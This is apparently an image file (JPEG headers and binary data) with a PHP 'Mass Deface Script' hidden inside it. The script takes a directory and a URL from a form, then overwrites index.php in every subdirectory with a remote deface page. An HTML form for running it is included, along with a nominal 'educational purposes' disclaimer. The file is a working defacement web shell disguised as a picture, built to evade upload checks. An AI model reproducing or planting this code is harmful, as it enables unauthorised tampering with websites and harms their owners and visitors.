����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������<?php
/*
Script: Mass Deface Script
Author: DonHaXor
Email: rezult.24@gmail.com
Disclaimer:
This script is for Research/Educational/Academic purposes only, 
The Author of this script takes no responsibility for the way
you use this script, you are responsible for your own actions.
*/
echo "<center><textarea rows='10' cols='100'>";
$defaceurl = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
echo $dir."\n";
 
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
                        if(filetype($dir.$file)=="dir"){
                                $newfile=$dir.$file."/index.php";
                                echo $newfile."\n";
                                if (!copy($defaceurl, $newfile)) {
                                        echo "failed to copy $file...\n";
                                }
                        }
        }
        closedir($dh);
    }
}
echo "</textarea></center>";
?>
<td align=right>Mass Defacement:</td><br>
<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
[+] Main Directory: <input type='text' style='width: 250px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'>
[+] Defacement Url: <input type='text' style='width: 250px' name='massdefaceurl'>
<input type='submit' name='execmassdeface' value='Execute'></form></td>
 
 
 
<br><br><br>
** Main Directory = The Directory you want to mass deface (Must have read/write permission) **<br>
** Defacement Url = URL of your deface page (e.g: http://yoursite.com/deface.html ) **<br><br>
By Abdou QS
</body></html>�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��